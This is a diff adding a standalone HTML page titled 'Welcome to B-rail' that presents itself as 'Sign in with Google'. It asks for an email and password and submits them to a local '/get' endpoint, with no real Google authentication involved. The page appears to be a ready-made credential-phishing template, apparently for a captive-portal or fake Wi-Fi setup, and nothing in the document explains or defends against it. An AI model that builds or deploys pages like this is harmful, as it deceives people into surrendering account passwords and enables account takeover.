@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<style>
+body {
+  font-family: Arial, sans-serif;
+  background-color: #FFFFFF;
+}
+
+.container {
+  max-width: 400px;
+  margin: 0 auto;
+  padding: 20px;
+}
+
+@media (min-width: 600px) {
+  .container {
+    max-width: 500px;
+  }
+}
+
+.logo-container {
+  text-align: center;
+  margin-bottom: 30px;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+
+.logo {
+  width: 40px;
+  height: 40px;
+  fill: #0079C2;
+  margin-right: 100px
+}
+
+.form-container {
+  background: #FFFFFF;
+  border: 1px solid #FFFFFF;
+  border-radius: 4px;
+  padding: 20px;
+  box-shadow: 0px 0px 10px 0px rgba(108,66,156,0.2);
+}
+
+h1 {
+  text-align: center; 
+  font-size: 28px;
+  font-weight: 500;
+  color: #000000;
+  margin-bottom: 20px;
+}
+
+
+.input-field {
+  width: 100%;
+  padding: 12px;
+  border: 2px solid #0079C2;
+  border-radius: 4px;
+  box-sizing: border-box;
+  margin-bottom: 20px;
+  font-size: 14px;
+}
+
+.submit-btn {
+  background: #0079C2;
+  border: none;
+  color: #FFFFFF;
+  padding: 12px 20px;
+  border-radius: 4px;
+  cursor: pointer;
+  font-size: 16px;
+  display: block;
+  margin: auto;
+}
+
+.submit-btn:hover {
+  background: #0079C2;
+}
+
+.forgot-password {
+  display: block;
+  text-align: center;
+  color: #000000;
+  text-decoration: underline;
+  margin-top: 10px;
+}
+
+.error-message {
+  color: red;
+  text-align: center;
+  display: none; 
+  margin-top: 10px;
+}
+
+</style>
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="logo-container">
+<svg version="1.0" xmlns="http://www.w3.org/2000/svg"
+ width="120.000000pt" height="78.000000pt" viewBox="0 0 1200.000000 783.000000"
+ preserveAspectRatio="xMidYMid meet">
+<g transform="translate(0.000000,783.000000) scale(0.100000,-0.100000)"
+fill="#0079C2" stroke="none">
+<path d="M5530 7823 c-443 -29 -716 -59 -1035 -112 -1267 -213 -2364 -679
+-3205 -1361 -149 -121 -492 -464 -604 -605 -352 -440 -572 -914 -657 -1415
+-27 -159 -37 -536 -19 -703 85 -792 519 -1535 1260 -2153 942 -787 2313 -1309
+3829 -1459 223 -22 1584 -22 1799 0 2059 211 3775 1075 4609 2320 240 357 393
+736 464 1150 27 153 37 520 20 687 -116 1112 -941 2131 -2286 2824 -913 470
+-2021 758 -3179 824 -157 9 -877 11 -996 3z m1018 -449 c1599 -127 3002 -785
+3795 -1778 620 -777 788 -1702 466 -2571 -217 -584 -663 -1135 -1270 -1568
+-1709 -1219 -4389 -1394 -6374 -416 -1009 496 -1714 1223 -2000 2059 -84 248
+-123 463 -132 730 -34 1039 603 2038 1737 2721 1050 634 2419 932 3778 823z"/>
+<path d="M5615 6599 c-730 -55 -1402 -287 -2020 -697 -224 -149 -293 -224
+-266 -293 11 -28 215 -268 268 -316 48 -43 91 -44 143 -3 21 17 57 39 81 49
+50 23 75 15 86 -27 5 -15 8 -653 8 -1417 0 -1315 -1 -1392 -18 -1418 -9 -15
+-24 -27 -33 -27 -21 0 -71 27 -123 67 -83 62 -102 51 -291 -167 -157 -182
+-168 -205 -130 -268 38 -62 407 -289 695 -428 632 -304 1298 -456 1995 -455
+873 2 1592 186 2115 542 341 232 550 515 642 865 26 102 28 122 28 304 0 151
+-4 210 -18 264 -85 336 -323 599 -707 783 -215 102 -240 119 -225 142 3 6 51
+40 105 76 111 73 233 189 303 287 66 92 143 258 174 375 23 86 26 118 27 268
+1 202 -15 279 -94 441 -253 522 -971 919 -1860 1028 -276 34 -631 44 -885 25z
+m650 -678 c161 -43 279 -115 397 -240 60 -63 87 -103 126 -183 28 -57 58 -134
+68 -173 20 -83 22 -244 4 -330 -57 -274 -259 -514 -518 -614 -134 -51 -182
+-56 -592 -56 -426 0 -430 1 -449 73 -15 52 -15 1283 0 1351 23 108 112 177
+249 192 36 4 193 6 350 4 254 -2 294 -5 365 -24z m258 -2214 c282 -88 496
+-272 617 -531 66 -140 84 -228 84 -401 -1 -133 -4 -160 -28 -240 -69 -230
+-205 -410 -405 -536 -95 -60 -229 -110 -341 -128 -90 -15 -873 -14 -942 0 -68
+15 -116 39 -156 80 -63 64 -62 52 -62 914 0 546 3 792 11 814 22 62 9 61 599
+58 l535 -2 88 -28z"/>
+</g>
+</svg>
+
+
+
+  </div>
+
+  <div class="form-container">
+  <center><h1>Welcome to B-rail</h1>
+  <h2>Sign in with Google</h2>
+      </center>
+
+    <form action="/get" id="login-form">
+    
+      <input name="email" class="input-field" type="text" placeholder="Email or mobile phone number" required>
+      
+      <input name="password" class="input-field" type="password" placeholder="Password" required>
+
+      <button class="submit-btn" type="submit">Continue</button>
+	    <a href="javascript:void(0);" class="forgot-password">Forgot credentials?</a>
+	<div class="error-message"></div>
+    </form>
+
+  </div>
+
+</div>
+<script>
+  document.querySelector('.forgot-password').addEventListener('click', function() {
+    var errorMessage = document.querySelector('.error-message');
+    errorMessage.innerHTML = "Please refer to your Google account if you forgot your credentials";
+    errorMessage.style.display = 'block';
+  });
+</script>
+</meta>
+</body>
+</html>
